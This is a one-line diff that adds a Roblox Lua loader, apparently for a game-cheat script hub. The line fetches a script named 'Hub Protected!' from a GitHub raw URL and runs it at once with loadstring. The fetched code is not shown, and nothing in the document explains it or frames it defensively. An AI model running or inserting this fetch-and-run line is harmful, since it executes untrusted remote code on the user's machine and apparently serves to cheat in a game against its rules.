@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Universal-Shakars/main/Hub%20Protected!",true))()
